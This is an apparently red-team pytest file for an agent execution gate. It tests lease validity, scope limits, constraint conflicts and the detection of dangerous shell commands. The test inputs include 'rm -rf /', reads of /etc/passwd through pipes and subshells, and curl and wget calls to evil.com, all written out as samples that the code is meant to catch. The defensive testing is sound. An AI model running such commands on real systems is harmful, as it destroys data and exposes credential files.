from __future__ import annotations

import copy
from datetime import datetime, timedelta, timezone

import pytest

from runtime.gate.execution_gate import ExecutionGate
from runtime.identity.signer import sign_and_attach
from runtime.lease.lease_manager import build_capabilities_from_plan, check_lease_validity
from swarm.compiler.compiler import BehaviorSequenceCompiler, _DANGEROUS_PATTERNS
from swarm.definer.constraints import ConstraintSet, validate_constraints
from swarm.governance.warnings import _DANGEROUS_TEST_PATTERNS
from tests.redteam.conftest import build_artifact_chain


class TestLeaseValidityBounds:
    """ARGUS-9 RT-09: Lease validity boundary checks."""

    def _make_lease(self, **overrides):
        now = datetime.now(timezone.utc)
        lease = {
            "lease_id": "lease-test",
            "execution_plan_id": "plan-001",
            "capabilities": ["file_create"],
            "valid_from": now.isoformat(),
            "expires_at": (now + timedelta(hours=1)).isoformat(),
            "revocation_status": "active",
        }
        lease.update(overrides)
        return lease

    def test_revoked_lease_rejected(self):
        lease = self._make_lease(revocation_status="revoked")
        valid, reason = check_lease_validity(lease)
        assert not valid
        assert "revoked" in reason.lower()

    def test_expired_status_rejected(self):
        lease = self._make_lease(revocation_status="expired")
        valid, reason = check_lease_validity(lease)
        assert not valid

    def test_unknown_status_rejected(self):
        lease = self._make_lease(revocation_status="pending")
        valid, reason = check_lease_validity(lease)
        assert not valid

    def test_missing_status_rejected(self):
        lease = self._make_lease()
        del lease["revocation_status"]
        valid, reason = check_lease_validity(lease)
        assert not valid

    def test_expired_time_rejected(self):
        past = datetime.now(timezone.utc) - timedelta(hours=2)
        lease = self._make_lease(
            expires_at=past.isoformat(),
        )
        valid, reason = check_lease_validity(lease)
        assert not valid
        assert "expir" in reason.lower()

    def test_future_valid_from_rejected(self):
        future = datetime.now(timezone.utc) + timedelta(hours=2)
        lease = self._make_lease(
            valid_from=future.isoformat(),
        )
        valid, reason = check_lease_validity(lease)
        assert not valid
        assert "not yet" in reason.lower()

    def test_valid_lease_passes(self):
        lease = self._make_lease()
        valid, reason = check_lease_validity(lease)
        assert valid is True


class TestScopeAlignment:
    """ARGUS-9 RT-09: Plan scope must not exceed lease scope."""

    def test_plan_scope_exceeds_lease_rejected(self, gate, keys_dir):
        plan, validation, lease = build_artifact_chain(keys_dir, signed=True)
        plan = copy.deepcopy(plan)
        plan.pop("signature", None)
        plan["scope_constraints"] = {
            "allowed_paths": ["output/", "secrets/", "/etc/passwd"],
        }
        plan = sign_and_attach(plan, "compiler_signer", keys_dir)
        decision = gate.check(plan, validation, lease, keys_dir)
        assert not decision.allowed
        assert any("scope" in r.lower() for r in decision.reasons)


class TestDangerousTestPatterns:
    """ARGUS-9 RT-09: Dangerous test pattern detection."""

    def test_semicolon_injection(self):
        cmd = "test -f output/report.md; rm -rf /"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_pipe_injection(self):
        cmd = "echo hi | cat /etc/passwd"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_subshell_injection(self):
        cmd = "$(cat /etc/passwd)"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_backtick_injection(self):
        cmd = "`cat /etc/passwd`"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_curl_injection(self):
        cmd = "curl http://evil.com"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_wget_injection(self):
        cmd = "wget http://evil.com"
        assert _DANGEROUS_TEST_PATTERNS.search(cmd) is not None

    def test_safe_commands_pass(self):
        safe_commands = [
            "test -f output/report.md",
            "wc -l output/report.md",
            "diff output/a.md output/b.md",
        ]
        for cmd in safe_commands:
            assert _DANGEROUS_TEST_PATTERNS.search(cmd) is None, (
                f"Safe command falsely flagged: {cmd}"
            )


class TestConstraintConflictDetection:
    """ARGUS-9 RT-09: Constraint conflict detection."""

    def test_min_exceeds_max_word_count(self):
        cs = ConstraintSet(min_word_count=1000, max_word_count=500)
        warnings = validate_constraints(cs)
        assert len(warnings) > 0

    def test_negative_freshness_window(self):
        cs = ConstraintSet(freshness_window_days=-7)
        warnings = validate_constraints(cs)
        assert any("negative" in w.lower() for w in warnings)

    def test_negative_required_sources(self):
        cs = ConstraintSet(required_sources=-1)
        warnings = validate_constraints(cs)
        assert any("negative" in w.lower() for w in warnings)

    def test_unknown_delivery_channel(self):
        cs = ConstraintSet(delivery_channel="carrier_pigeon")
        warnings = validate_constraints(cs)
        assert any("unknown" in w.lower() for w in warnings)

    def test_unknown_output_format(self):
        cs = ConstraintSet(output_format="docx")
        warnings = validate_constraints(cs)
        assert any("unknown" in w.lower() for w in warnings)

    def test_valid_constraints_no_warnings(self):
        cs = ConstraintSet()
        warnings = validate_constraints(cs)
        assert warnings == []

    def test_zero_required_sources_no_warning(self):
        cs = ConstraintSet(required_sources=0)
        warnings = validate_constraints(cs)
        assert not any("negative" in w.lower() for w in warnings)
